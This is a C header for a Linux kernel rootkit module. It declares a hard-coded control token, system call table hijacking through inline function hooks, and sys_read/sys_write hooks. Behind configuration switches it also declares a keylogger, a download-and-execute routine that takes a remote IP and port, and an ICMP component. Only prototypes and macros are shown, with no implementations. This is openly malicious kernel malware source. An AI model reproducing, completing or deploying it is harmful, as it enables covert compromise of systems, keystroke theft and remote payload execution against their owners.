#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/fs.h>

#define AUTH_TOKEN 0x12345678   // Authentication token for rootkit control
#define __DEBUG__ 1             // General debugging statements
#define __DEBUG_HOOK__ 1        // Debugging of inline function hooking
#define __DEBUG_KEY__ 1         // Debugging of user keypresses
#define __DEBUG_RW__ 1          // Debugging of sys_read and sys_write hooks

extern unsigned long *sys_call_table;

char *strnstr ( const char *haystack, const char *needle, size_t n );
void *memmem ( const void *haystack, size_t haystack_size, const void *needle, size_t needle_size );
void *memstr ( const void *haystack, const char *needle, size_t size );

void hijack_start ( void *target, void *new );
void hijack_pause ( void *target );
void hijack_resume ( void *target );
void hijack_stop ( void *target );

#if defined(_CONFIG_X86_64_)
extern unsigned long *ia32_sys_call_table;
#endif

#if defined(_CONFIG_KEYLOGGER_)
void keylogger_init ( void );
void keylogger_exit ( void );
#endif

#if defined(_CONFIG_HOOKRW_)
void hookrw_init ( void );
void hookrw_exit ( void );
#endif

#if defined(_CONFIG_DLEXEC_)
void dlexec_init ( void );
void dlexec_exit ( void );
int dlexec_queue ( char *path, unsigned int ip, unsigned short port, unsigned int retry, unsigned int delay );
#endif

#if defined(_CONFIG_ICMP_)
void icmp_init ( void );
void icmp_exit ( void );
#endif
